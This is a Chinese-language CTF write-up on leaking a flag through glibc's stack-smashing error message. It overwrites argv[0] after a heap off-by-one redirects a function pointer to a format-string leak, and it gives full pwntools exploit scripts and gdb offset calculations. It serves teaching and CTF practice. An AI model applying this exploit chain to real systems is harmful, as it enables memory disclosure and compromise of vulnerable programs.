# 利用SSP泄露获取flag

### 机制讲解

**SSP** 是编译器为了防止栈溢出攻击加入的一种保护机制

当程序运行时检测到Canary被破坏，会触发 `__stack_chk_fail` 函数，准备终止程序并报错。

**关键特性：**

* **报错机制：** 在 glibc 2.25 及以下版本中，报错函数会打印当前程序的名称

我们来看glibc各版本的不同：

[font color="#1E90FF"]**glibc2.23-2.25**[/font]

```c
extern char **__libc_argv attribute_hidden;
void__attribute__ ((noreturn)) internal_function
__fortify_fail (const char *msg)
{  
/* The loop is added only to keep gcc happy.  */  
while (1)  
    __libc_message (2, "*** %s ***: %s terminated\n",  
                 msg, __libc_argv[0] ?: "<unknown>");
                 }
libc_hidden_def (__fortify_fail)
```

可以看到报错信息如下

`*** stack smashing detected ***:__libc_argv[0] terminated`

一般而言，`__libc_argv[0]`指向的是**程序名**

实际打印信息应该是

`*** stack smashing detected `**`***`**`:./pwn（程序名） terminated`

在[font color="#1E90FF"]**glibc2.26-2.30**[/font]中

```c
extern char **__libc_argv attribute_hidden;
void__attribute__ ((noreturn)) internal_function
__fortify_fail_abort (_Bool need_backtrace, const char *msg)
{  /* The loop is added only to keep gcc happy. 
 Don't pass down __libc_argv[0] if we aren't doing backtrace 
 since __libc_argv[0] may point to the corrupted stack.  */  
 while (1)   
     __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort,
                         "*** %s ***: %s terminated\n",
                               msg,
                     (need_backtrace && __libc_argv[0] != NULL
                       ? __libc_argv[0] : "<unknown>"));
}
```

增加了 `__libc_argv[0] != NULL` 的检查，并且受 `need_backtrace` 变量控制

虽然稍微麻烦了一点，但依然存在泄露可能

但进入[font color="#1E90FF"]**glibc2.31+**[/font]的版本后，源码变为了

```c
__libc_message (do_abort, "*** %s ***: terminated\n", msg);
```

可以看到，第二个 `%s` 被删除了，**不再打印程序名**

无论怎么覆盖 `argv[0]`，报错信息里都不会再输出那个内容了

### 核心原理

#### [font color="#32CD32"]正常流程[/font]

当检测到 Canary 错误时，调用链如下：

1. `__stack_chk_fail`
2. `__fortify_fail`
3. `__libc_message`

在 **glibc 2.23 - 2.25** (最典型的版本) 中，`__libc_message` 的关键代码是这一行：

```c
__libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "<unknown>");
```

* **第一个 `%s` (msg):** 输出 "stack smashing detected"。
* **第二个** `%s` **(**\_\_**libc**\_**argv[0])：**它原本意图是输出当前运行的程序名
* **`__libc_argv` :** 这是一个全局变量，指向栈上的 `argv` 数组（存储命令行参数的指针数组）而 `argv[0]` 通常指向**程序名称字符串**

#### [font color="#FF1493"]攻击流程[/font]

如果我们利用**栈溢出**做两件事：

1. **破坏 Canary：** 故意覆盖它，为触发报错函数 `__stack_chk_fail`
2. **覆盖 argv[0] 指针：** 既然我们已经造成了溢出，如果溢出的长度足够长，我们就可以一直淹没到栈的高地址，覆盖掉存储在栈上的 `argv[0]` 指针

**攻击结果：** 我们将 `argv[0]` 的值覆盖为 **Flag 在内存中的地址**

当程序执行到 `__libc_message` 时，它去读取 `argv[0]` 指向的内容，会读到了 Flag，并把它打印出来：

```bash
*** stack smashing detected ***: flag{This_is_the_flag} terminated
```

**利用条件：**

1. **Flag 已在内存中：** 题目通常会先读取 flag 到某个全局变量或堆/栈地址中
2. **超长溢出：** 可以溢出的长度必须非常大，足以跨过 Canary、返回地址，一直到达存放 `argv` 指针的区域
3. **Flag 的地址：** 需要知道 flag 存储在哪

**在这种特定场景下：**

我们无法getshell，因此出现的题目一般**已经将flag读进内存**，想办法覆盖 `__libc_argv[0]`为**flag地址**即可

或者此漏洞出现在fork出的子进程中，可以实现**任意地址泄露**

### 例题分析

#### 准备工作

由于题目提供了**2.23版本的libc**，我们需要先用 `patchelf` 把 libc 和 ld 链接上去

```bash
$patchelf --set-interpreter ./ld-2.23.so ./canary4
$patchelf --replace-needed libc.so.6 ./libc-2.23.so ./canary4
```

注意，这里用 `ldd` 检查后发现libc**没有修改成功**

![image.png](http://joker233.top/usr/uploads/2025/12/502808208.png)

虽然指定了本地 `./libc-2.23.so`，但系统在查找时使用了**绝对路径**

可以用这个指令查看依赖

```bash
$readelf -d canary4 | grep NEEDED
```

![image.png](http://joker233.top/usr/uploads/2025/12/4045294331.png)

再用 `patchelf` 替换一下路径

```bash
$patchelf --replace-needed /home/s1eepy/pwn/chuti/canary/glibc2.23/libc-2.23.so ./libc-2.23.so ./canary4
```

另外，我们还需要创建一个flag文件，让程序读进内存，这样才能本地运行测试

直接起一个docker容器也是可以的

---

先检查安全机制

![image.png](http://joker233.top/usr/uploads/2025/12/4049861091.png)

[font color="#D3D3D3"]~~有PIE？（警觉）~~[/font]

打开IDA看看

```c
__int64 play()
{
  int n4; // [rsp+4h] [rbp-5Ch] BYREF
  int i; // [rsp+8h] [rbp-58h]
  int fd; // [rsp+Ch] [rbp-54h]
  void *ptr; // [rsp+10h] [rbp-50h]
  void *buf; // [rsp+18h] [rbp-48h]
  void (*v7)(void); // [rsp+28h] [rbp-38h]
  _BYTE buf_1[40]; // [rsp+30h] [rbp-30h] BYREF
  unsigned __int64 v9; // [rsp+58h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  fd = open("./flag", 0);
  if ( fd >= 0 )
  {
    buf = malloc(0x30uLL);
    ptr = malloc(0x30uLL);
    *(_QWORD *)ptr = go_awy;
    read(fd, (char *)ptr + 8, 0x100uLL);
    for ( i = 0; i <= 1; ++i )
    {
      menu();
      __isoc99_scanf("%d", &n4);
      getchar();
      if ( n4 == 2 )
      {
        v7 = *(void (**)(void))ptr;
        if ( v7 )
          v7();
        free(ptr);
        ptr = 0LL;
        puts("FREE SUCCESS");
      }
      else if ( n4 > 2 )
      {
        if ( n4 == 3 )
        {
          puts("INPUT DATA:");
          read(0, buf, 0x41uLL);
          puts("EDIT SUCCESS");
        }
        else if ( n4 == 4 )
        {
          puts("BYE");
          exit(0);
        }
      }
      else if ( n4 == 1 )
      {
        if ( !malloc(0x20uLL) )
        {
          puts("MALLOC FAILED");
          exit(0);
        }
        puts("MALLOC SUCCESS");
      }
    }
    puts("Something to say :");
    read(0, buf_1, 0x200uLL);
    return 0LL;
  }
  else
  {
    puts("FLAG OPEN MET A FAULT");
    return 0xFFFFFFFFLL;
  }
}
```

我们来看看栈帧结构

| **偏移量** | **变量名**      | **说明**                     |
| ---------------- | --------------------- | ---------------------------------- |
| ...              | **argv[0]**     | **栈的深处，我们的攻击目标** |
| ...              | Return Addr           | 返回地址                           |
| ...              | Old RBP               | 上一个栈底指针                     |
| RBP-0x08         | **v9 (Canary)** | **覆盖以触发报错**           |
| RBP-0x30         | **buf\_1**      | **缓冲区，40字节**           |
| RBP-0x38         | v7                    | ...                                |
| RBP-0x48         | buf                   | **堆的指针变量**             |
| RBP-0x50         | **ptr**         | **堆的指针变量**             |
| ...              | ...                   | ...                                |

程序先将flag读入内存，再先后分配了一个大小均为**0x30**(实际是**0x40**，算上**Header**)的 `buf`和 `ptr`堆块

随后，`ptr`的开头被放入了 `go_awy`函数的地址， `ptr+8` 被放入了**flag的地址**

**初步的思路便有了**：如果我们能把 `argv[0]` 改成 `ptr指向的地址 + 8`，SSP 报错就会打印 Flag

接下来程序进入了一个两次的循环并打印菜单

![image.png](http://joker233.top/usr/uploads/2025/12/3051498917.png)

三个操作：**【1】新申请一个堆、【2】释放一个指针、【3】向buf指向的堆中添加数据**

观察选项2

```c
v7 = *(void (**)(void))ptr;
        if ( v7 )
          v7();
```

它从 ptr 指向的堆里取出函数地址，再执行这个函数

再观察选项3，发现有一个溢出点

```
read(0, buf, 0x41uLL);
```

我们可以将**堆内存布局**画出来：

```
低地址
+------------------------+
| Chunk A (buf) Header   | 0x10 字节
+------------------------+
| Chunk A Data (buf指向) | 0x30 字节 (48 字节)  
+------------------------+
| Chunk B (ptr) Header   | 0x10 字节 (16 字节)
+------------------------+
| Chunk B Data (ptr指向) | 8 字节：存放着 go_awy 函数地址
| ...                    |
+------------------------+
高地址
```

`buf堆块+Header`只有[font color="#FF1493"]**0x40**[/font]大小，但 `read`允许我们写入[font color="#FF1493"]**0x41**[/font]的数据，这意味着我们可以将 `ptr`函数指针的[font color="#1E90FF"]**最低位字节**[/font]覆盖掉

跳出循环后，有一个非常有用的溢出点：

```
read(0, buf_1, 0x200uLL)
```

这个溢出点足够大，可以为我们所用

---

分析完主函数后，我们发现了一个**没有在任何地方被调用过**的函数：`lucky_cup()`

```c
__int64 lucky_cup()
{
  printf("GIFT :%11$p");
  return 0LL;
}
```

这个函数利用格式化字符串漏洞**泄露了一个地址**，但我们并不知道这个函数泄露的具体是哪个地址

在PIE保护开启的情况下，我们只能看到函数的**偏移**

```c
go_awy = 0xC1C
lucky_cup = 0xC33
```

如果我们将[font color="#FF1493"]**\x1C**[/font]覆盖为[font color="#FF1493"]**\x33**[/font]

`ptr` 中的 `go_awy` 将会变成 `lucky_cup`

于是我们可以先写一个测试程序，看看它到底泄露了哪个地址

```python
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'
p = process('./canary4')
elf = ELF('./canary4')
gdb.attach(p)
 
p.recvuntil(b'\n')
p.sendline(b'3')
p.recvuntil(b'DATA:')
#overflow = b'A'*64 + b'\x33'
overflow = b'A'*48 + b'deadbeef' + p64(0x41) + b'\x33'
p.send(overflow)

p.recvuntil(b'\n')
p.sendline(b'2')

p.interactive()
```

[scode type="red" size=""]

#### 补充：

在第一次写脚本的时候，我错误的使用了

```python
overflow = b'A'*64 + b'\x33'
```

这会导致第二个堆块的**Header部分**被破坏

补充一下堆的结构

在 64 位系统中，一个 Chunk 的 **Header（头部）** 固定占用 **16 字节（0x10）**

大概长这样

```
+------------------------+------------------------+
|  prev_size (8 bytes)   |    size (8 bytes)      |
+------------------------+------------------------+
^                        ^
低地址                    高地址
```

在 pwndbg 里查看内存时，它是竖着排列的：

```
0x...000:  0x0000000000000000   <-- prev_size
0x...008:  0x0000000000000041   <-- size (包含标志位)
0x...010:  ......
```

##### 字段一：`prev_size` (前一个块的大小)

**位置：** 偏移 0x00 - 0x07

**作用：** 记录**物理相邻**的前面那个堆块的大小

**核心机制（空间复用）：**

* **如果前一个块是空闲的 (Free)：** 这个字段才真的存放“前一个块的大小”。目的是为了让当前块 Free 时，能向前合并
* **如果前一个块正在使用 (Allocated)：** 堆管理器觉得“既然前一个块在用，那你这个字段空着也是浪费”于是，**这个字段的空间实际上归前一个块使用**，前一个块的用户数据可以一直写到这里

##### 字段二：`size` (当前块大小 + 标志位）

**位置：** 偏移 0x08 - 0x0F

**作用：** 记录**当前这个块**的大小

**特点：** 因为 64 位系统下堆块必须 **16 字节对齐**，所以大小的**二进制最低 3 位永远是 0**

例如：`0x40` ->二进制 `... 0100 000`

既然最后 3 位没用，glibc 就把它们拿来当**标志位（Flags）**

结构如下： `Size = 真实大小(高位) + | A | M | P | (最低3位)`

* **Bit 0: P (PREV\_INUSE)**
  * `1`: 前一个块**正在使用**
  * `0`: 前一个块**是空闲的**
* **Bit 1: M (IS\_MMAPPED)**
  * `1`: 这个块是通过 `mmap` 分配的大块
  * `0`: 普通堆块
* **Bit 2: A (NON\_MAIN\_ARENA)**
  * `1`: 这个块不属于主线程
  * `0`: 属于主线程

在写脚本的时候，填充完 `buf`数据段后，需要伪造下一个堆块的**Header**，否则会触发[font color="#B22222"]***Error in `./canary4': double free or corruption (out): 堆地址 ***[/font]

[font color="#D3D3D3"]~~**理论上有fork()的时候也可以用这种方法泄露堆地址**~~[/font]

[/scode]

得到泄露地址

![image.png](http://joker233.top/usr/uploads/2025/12/3042032426.png)

附加gdb进程，使用 `heap`指令查看堆的状态

![image.png](http://joker233.top/usr/uploads/2025/12/4065028743.png)

看起来这个地址应该就是 `buf`堆块的**数据段起始地址**

这样的话，**flag的地址**便可以计算出来

[font color="#1E90FF"]***0x5646e7ed1010 + 0x48 = 0x5646e7ed1058***[/font]

---

最后一步是填充 `argv`数组

这里有两种办法

第一种是填充buf_1、Canary、RBP和返回地址后，用**大量的flag地址**去轰炸，总有一个能覆盖到

这种方法本地测试没问题，但是远程打不通

第二种方法是精确计算 `argv`的位置

```
b *$rebase(0xe6f)
```

我们在最后这个 `read` 处下断点，使用 `argv`指令

![image.png](http://joker233.top/usr/uploads/2025/12/3467848943.png)

`0x7fffffffddc8` 便是存放 `argv[0]`指针的地址

此时正准备执行 `read(0, buf_1, 0x200)`，根据 x64 调用约定：

* `rdi` = 0 (stdin)
* **`rsi` = buf\_1 的地址**
* `rdx` = 0x200

查看 `rsi`寄存器

```
i r rsi
```

![image.png](http://joker233.top/usr/uploads/2025/12/1340850534.png)

[font color="#1E90FF"]***0x7fffffffddc8 - 0x7fffffffdca0 = 0x128 = 296***[/font]

所以，我们只需要填充296个字符便可抵达 `argv`

最终exp：

```python
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'
#p = remote('ip',port)
p = process('./canary4')
elf = ELF('./canary4')
#gdb.attach(p)
 
p.recvuntil(b'\n')
p.sendline(b'3')
p.recvuntil(b'DATA:')

overflow = b'A'*48 + b'deadbeef' + p64(0x41) + b'\x33'
p.send(overflow)

p.recvuntil(b'\n')
p.sendline(b'2')

p.recvuntil(b'GIFT :')
leak = p.recvuntil(b'FREE SUCCESS', drop = True)
addr = int(leak,16)
flag = addr + 0x48
success(f'flag addr: {hex(flag)}')

p.recvuntil(b'Something to say :')

payload = b'A'*296 + p64(flag)
p.send(payload)

p.interactive()

```